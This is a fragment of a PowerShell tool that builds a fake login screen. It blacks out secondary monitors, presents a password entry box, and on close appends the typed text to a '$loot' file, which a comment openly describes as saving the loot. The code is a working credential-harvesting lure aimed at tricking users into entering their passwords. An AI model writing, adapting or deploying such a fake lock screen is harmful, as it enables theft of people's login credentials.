# function not used part of fade fuction
function joinImg($img1, $img2, $imgAtt)
{
    $result = New-Object System.Drawing.Bitmap($img2);
    $p = [System.Drawing.Graphics]::FromImage($result);
    $p.InterpolationMode = [System.Drawing.Drawing2D.InterpolationMode]::HighQualityBicubic;
    $p.DrawImage($img1, (New-Object System.Drawing.Rectangle(0,0, $img2.Width, $img2.Height)), 0, 0, $img2.Width, $img2.Height, [System.Drawing.GraphicsUnit]::Pixel, $imgAtt);
    $p.Dispose();
    $result;    
}

# function not used please see readme.md todo section
function doFade
{
    $cm = New-Object System.Drawing.Imaging.ColorMatrix;
    $ia = New-Object System.Drawing.Imaging.ImageAttributes;
    $transparency = [double]1.0;
    While ([double]$transparency -gt 0)
    {
        $cm.Matrix33 = $transparency;
        $ia.SetColorMatrix($cm, [System.Drawing.Imaging.ColorMatrixFlag]::Default, [System.Drawing.Imaging.ColorAdjustType]::Bitmap);
        $di = joinImg $BGImg $BGBlur $ia;
        $MainForm.BackgroundImage = $di;
        $MainForm.Refresh();
        $transparency = ([double]$transparency - [double](0.1));
    }
}

# Show panel 2 with the logo edit box
function showLogin
{
    if (!$Panel2.Visible)
    {
        $Panel2.Visible = $True;
        $MainForm.ActiveControl = $TextBox;
    }
}

# Put a blank screen on all sub screens
function showBlanks()
{
    $Screens = [system.windows.forms.screen]::AllScreens;
    for($i = 1; $i -lt $Screens.Count; $i++){ 
        $j = $blanks.Add((New-Object System.Windows.Forms.Form));
        $AForm = $blanks[$j];
        $AForm.Text = "Blank $j";
        $AForm.Size = $Screens[$i].WorkingArea.Size;
        $AForm.Location = $Screens[$i].WorkingArea.Location; 
        $AForm.KeyPreview = $True;
        $AForm.FormBorderStyle = "0";
        $AForm.MaximizeBox = $false;
        $AForm.StartPosition = 'Manual';
        $AForm.WindowState = 'Maximized';
        $AForm.BackColor = 'Black';
        $MainForm.Add_Shown({$AForm.Activate()});
        [void] $AForm.Show();
        $AForm.BringToFront();
    }
}

# close blank sub forms
function closeBlanks()
{
    $blanks | % {[void]$_.Close();} 
}

# guess what it closes the forms
# and saves the loot
function onClose()
{    
    closeBlanks;
    [void] $MainForm.Close(); 
    Write-Output ($TextBox.Text) | Out-File -FilePath $loot -Append
}

